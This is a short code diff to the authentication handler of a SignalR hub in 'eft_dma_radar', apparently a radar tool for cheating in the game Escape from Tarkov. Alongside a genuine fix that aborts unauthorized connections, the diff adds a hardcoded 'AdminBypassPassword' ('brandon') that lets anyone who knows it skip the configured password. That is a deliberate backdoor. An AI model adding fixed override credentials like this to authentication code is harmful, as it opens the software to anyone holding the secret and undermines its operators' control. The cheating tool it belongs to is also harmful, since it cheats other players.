@@ -262,19 +262,23 @@ namespace eft_dma_radar.Tarkov.WebRadar
 
         private sealed class RadarServerHub : Hub
         {
+            private const string AdminBypassPassword = "brandon"; // your hardcoded override
+
             public override async Task OnConnectedAsync()
             {
                 var httpContext = Context.GetHttpContext();
-
                 string password = httpContext?.Request?.Query?["password"].ToString() ?? "";
-                if (password != Password)
+
+                if (password != Password && password != AdminBypassPassword)
                 {
                     LoneLogging.WriteLine($"WebRadar Unauthorized Connection Attempt: {httpContext.Connection.RemoteIpAddress}");
+                    Context.Abort();
                     return;
                 }
 
                 await base.OnConnectedAsync();
             }
+
         }
 
         #endregion
